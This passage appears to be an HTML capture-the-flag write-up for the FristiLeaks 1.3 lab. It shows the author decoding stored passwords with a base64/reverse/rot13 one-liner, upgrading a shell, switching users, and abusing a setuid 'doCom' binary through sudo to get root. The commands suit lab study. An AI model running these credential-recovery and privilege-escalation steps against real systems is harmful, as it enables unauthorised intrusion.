+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;1&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;45K&nbsp;Nov&nbsp;18&nbsp;&nbsp;2015&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span><br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;1&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;48K&nbsp;Nov&nbsp;18&nbsp;&nbsp;2015&nbsp;<span style="color:#ff9d00;font-weight:700">chmod</span><br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;737&nbsp;Nov&nbsp;18&nbsp;&nbsp;2015&nbsp;cronjob.py<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;21&nbsp;Nov&nbsp;18&nbsp;&nbsp;2015&nbsp;cryptedpass.txt<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;258&nbsp;Nov&nbsp;18&nbsp;&nbsp;2015&nbsp;cryptpass.py<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;1&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;89K&nbsp;Nov&nbsp;18&nbsp;&nbsp;2015&nbsp;<span style="color:#ff9d00;font-weight:700">df</span><br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;1&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;24K&nbsp;Nov&nbsp;18&nbsp;&nbsp;2015&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span><br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;1&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;160K&nbsp;Nov&nbsp;18&nbsp;&nbsp;2015&nbsp;<span style="color:#ff9d00;font-weight:700">egrep</span><br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;1&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;160K&nbsp;Nov&nbsp;18&nbsp;&nbsp;2015&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span><br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;1&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;84K&nbsp;Nov&nbsp;18&nbsp;&nbsp;2015&nbsp;<span style="color:#ff9d00;font-weight:700">ps</span><br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;fristigod&nbsp;fristigod&nbsp;&nbsp;&nbsp;25&nbsp;Nov&nbsp;19&nbsp;&nbsp;2015&nbsp;whoisyourgodnow.txt<br>
+                sh-4.1$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;cryptedpass.txt<br>
+                mVGZ3O3omkJLmy2pcuTq<br>
+                sh-4.1$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;cryptpass.py<br>
+                <span style="color:#0088ff;font-weight:400">#Enhanced&nbsp;with&nbsp;thanks&nbsp;to&nbsp;Dinesh&nbsp;Singh&nbsp;Sikawar&nbsp;@LinkedIn</span><br>
+                import&nbsp;base64,codecs,sys<br>
+                <br>
+                def&nbsp;encodeString<span style="color:#ff9d00;font-weight:700">(</span>str<span style="color:#ff9d00;font-weight:700">):</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">base64string</span>=&nbsp;base64.b64encode<span style="color:#ff9d00;font-weight:700">(</span>str<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;codecs.encode<span style="color:#ff9d00;font-weight:700">(</span>base64string[<span style="color:#ff9d00;font-weight:700">::</span>-1],&nbsp;<span style="color:#3ad900;font-weight:400">'rot13'</span><span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                <span style="color:#7f0044;font-weight:400">cryptoResult</span>=encodeString<span style="color:#ff9d00;font-weight:700">(</span>sys.argv[1]<span style="color:#ff9d00;font-weight:700">)</span><br>
+                print&nbsp;cryptoResult<br>
+                sh-4.1$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;whoisyourgodnow.txt<br>
+                =RFn0AKnlMHMPIzpyuTI0ITG
+            </div>
+        </div><br>
+        <br>
+        So we've found 2 “encrypted� passwords.<br>
+        cryptedpass.txt - <code>mVGZ3O3omkJLmy2pcuTq</code><br>
+        whoisyourgodnow.txt - <code>=RFn0AKnlMHMPIzpyuTI0ITG</code><br>
+        <br>
+        And a python script which has been used to encrypted them:<br>
+            <div class="codebox">
+                <span style="color:#0088ff;font-weight:400">#Enhanced&nbsp;with&nbsp;thanks&nbsp;to&nbsp;Dinesh&nbsp;Singh&nbsp;Sikawar&nbsp;@LinkedIn</span><br>
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;base64,codecs,sys<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">def</span>&nbsp;encodeString(<span style="color:#ff9d00;font-weight:700">str</span>):<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;base64string=&nbsp;base64.b64encode(<span style="color:#ff9d00;font-weight:700">str</span>)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;codecs.encode(base64string[::-<span style="color:#ff0044;font-weight:400">1</span>],&nbsp;<span style="color:#3ad900;font-weight:400">'rot13'</span>)<br>
+                <br>
+                cryptoResult=encodeString(sys.argv[<span style="color:#ff0044;font-weight:400">1</span>])<br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;cryptoResult
+            </div>
+        </div><br>
+        <br>
+        Thankfully this is nice and simple.<br>
+        <br>
+        1. The string gets base64 encoded - <code>base64string= base64.b64encode(str)</code><br>
+        2. The base64 encoded string gets reversed - <code>base64string[::-</code><code><span style="color:#ff0044;">1</span></code><code>]</code><br>
+        3. And finally, the reversed base64 encoded string getsrot13'd - <code>codecs.encode(base64string[::-1], 'rot13')</code><br>
+        <br>
+        We just have to reverse this process to get the original string.<br>
+        <br>
+        1. rot13 the base64 encoded string we currently have<br>
+        2. Reverse it<br>
+        2. Base64 decode the un-rot13'd, un-reversed string<br>
+        <br>
+        Here's a bash 1 liner:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>fristileaks1.3#&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"mVGZ3O3omkJLmy2pcuTq"</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">tr</span>&nbsp;<span style="color:#3ad900;font-weight:400">'A-Za-z'</span>&nbsp;<span style="color:#3ad900;font-weight:400">'N-ZA-Mn-za-m'</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;rev&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;base64&nbsp;-d<br>
+                thisisalsopw123<br>
+            </div>
+        </div><br>
+        <br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>fristileaks1.3#&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"=RFn0AKnlMHMPIzpyuTI0ITG"</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">tr</span>&nbsp;<span style="color:#3ad900;font-weight:400">'A-Za-z'</span>&nbsp;<span style="color:#3ad900;font-weight:400">'N-ZA-Mn-za-m'</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;rev&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;base64&nbsp;-d<br>
+                LetThereBeFristi<span style="color:#ff9d00;font-weight:700">!</span>
+            </div>
+        </div><br>
+        <br>
+        <code>|</code> pipes the output of the command to whatever you enter next<br>
+        echo the encrypted string - <code>echo "mVGZ3O3omkJLmy2pcuTq"</code><br>
+        pipe it to rot13 - <code>| tr 'A-Za-z' 'N-ZA-Mn-za-m'</code><br>
+        pipe it to reverse string - <code>| rev</code><br>
+        pipe to base64 decode - <code>| base64 -d</code><strong><br></strong><br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) root beer</strong></h2><br>
+        Upgrade your shell first, then you'll be able to switch user to fristigod<br>
+            <div class="codebox">
+                sh-4.1$&nbsp;<span style="color:#ff9d00;font-weight:700">which</span>&nbsp;python<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>python<br>
+                sh-4.1$&nbsp;python&nbsp;-c&nbsp;<span style="color:#3ad900;font-weight:400">'import&nbsp;pty;&nbsp;pty.spawn("/bin/bash")'</span>&nbsp;<br>
+                bash-4.1$&nbsp;<span style="color:#ff9d00;font-weight:700">su</span>&nbsp;fristigod<br>
+                Password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;LetThereBeFristi<span style="color:#ff9d00;font-weight:700">!</span><br>
+                <br>
+                bash-4.1$&nbsp;
+            </div>
+        </div><br>
+        <br>
+        Once I get access to a new user on a system, I have a look at what files that user owns to (maybe) find stuff I couldn't previously access<br>
+        <code>find / -user fristigod 2&gt;/dev/null</code><br>
+        <br>
+            <div class="codebox">
+                bash-4.1$&nbsp;<span style="color:#ff9d00;font-weight:700">find</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;-user&nbsp;fristigod&nbsp;2&gt;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>proc<span style="color:#ff9d00;font-weight:700">/</span>3063<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>proc<span style="color:#ff9d00;font-weight:700">/</span>3063<span style="color:#ff9d00;font-weight:700">/</span>task<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>proc<span style="color:#ff9d00;font-weight:700">/</span>3063<span style="color:#ff9d00;font-weight:700">/</span>task<span style="color:#ff9d00;font-weight:700">/</span>3063<br>
+                ...<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>fristigod<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>fristigod<span style="color:#ff9d00;font-weight:700">/</span>.bash_history<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>fristigod<span style="color:#ff9d00;font-weight:700">/</span>.secret_admin_stuff
+            </div>
+        </div><br>
+        <br>
+        <code>/var/fristigod</code> looks interesting.<br>
+        <br>
+        We find a setuid binary called <code>doCom</code> (presumably stands for ‘do command’?)<br>
+        <code>doCom</code> will run as root because it's owned by root and because it has a setuid bit (the S)<br>
+        <code>-rwsr-sr-x 1 root root 7.4K Nov 25 2015 doCom</code><br>
+        setuid bits make a binary run with the privileges of its owner.<br>
+        <br>
+        Reading .bash_history tells us how to use the binary- <code>sudo -u fristi ./doCom &lt;command&gt;</code><br>
+            <div class="codebox">
+                bash-4.1$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>fristigod<br>
+                bash-4.1$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh<br>
+                total&nbsp;16K<br>
+                drwxr<span style="color:#ffdd00;font-weight:400">-x</span>---&nbsp;&nbsp;&nbsp;3&nbsp;fristigod&nbsp;fristigod&nbsp;4.0K&nbsp;Nov&nbsp;25&nbsp;&nbsp;2015&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>.&nbsp;19&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Nov&nbsp;19&nbsp;&nbsp;2015&nbsp;..<br>
+                -rw-------&nbsp;&nbsp;&nbsp;1&nbsp;fristigod&nbsp;fristigod&nbsp;&nbsp;864&nbsp;Nov&nbsp;25&nbsp;&nbsp;2015&nbsp;.bash_history<br>
+                drwxrwxr<span style="color:#ffdd00;font-weight:400">-x</span>.&nbsp;&nbsp;2&nbsp;fristigod&nbsp;fristigod&nbsp;4.0K&nbsp;Nov&nbsp;25&nbsp;&nbsp;2015&nbsp;.secret_admin_stuff<br>
+                bash-4.1$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;.bash_history<br>
+                ...<br>
+                <span style="color:#ff9d00;font-weight:700">sudo</span>&nbsp;-u&nbsp;fristi&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>doCom&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span><br>
+                ...<br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                bash-4.1$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;.secret_admin_stuff<br>
+                bash-4.1#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh<br>
+                total&nbsp;16K<br>
+                drwxrwxr<span style="color:#ffdd00;font-weight:400">-x</span>.&nbsp;2&nbsp;fristigod&nbsp;fristigod&nbsp;4.0K&nbsp;Nov&nbsp;25&nbsp;&nbsp;2015&nbsp;.<br>
+                drwxr<span style="color:#ffdd00;font-weight:400">-x</span>---&nbsp;&nbsp;3&nbsp;fristigod&nbsp;fristigod&nbsp;4.0K&nbsp;Nov&nbsp;25&nbsp;&nbsp;2015&nbsp;..<br>
+                -rwsr-sr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7.4K&nbsp;Nov&nbsp;25&nbsp;&nbsp;2015&nbsp;doCom<br>
+                bash-4.1$&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;doCom<br>
+                doCom<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;setuid&nbsp;setgid&nbsp;ELF&nbsp;64-bit&nbsp;LSB&nbsp;executable,&nbsp;x86-64,&nbsp;version&nbsp;1&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>SYSV<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;dynamically&nbsp;linked&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>uses&nbsp;shared&nbsp;libs<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">GNU</span>/Linux&nbsp;2.6.18,&nbsp;not&nbsp;stripped<br>
+                bash-4.1$&nbsp;./doCom&nbsp;bash<br>
+                Nice&nbsp;try,&nbsp;but&nbsp;wrong&nbsp;user&nbsp;;)<br>
+                bash-4.1$&nbsp;sudo&nbsp;-u&nbsp;fristi&nbsp;./doCom&nbsp;/bin/bash<br>
+                bash-4.1#&nbsp;id<br>
+                id<br>
+                uid=0(root)&nbsp;gid=100(users)&nbsp;groups=100(users),502(fristigod)<br>
+                bash-4.1#&nbsp;<br>
+                <br>
+            </div>
+        </div><br>
+        <br>
+        Root!<br>
+        Drink fristi.
+    </writeup>
+</section>
+</body>
+</html>
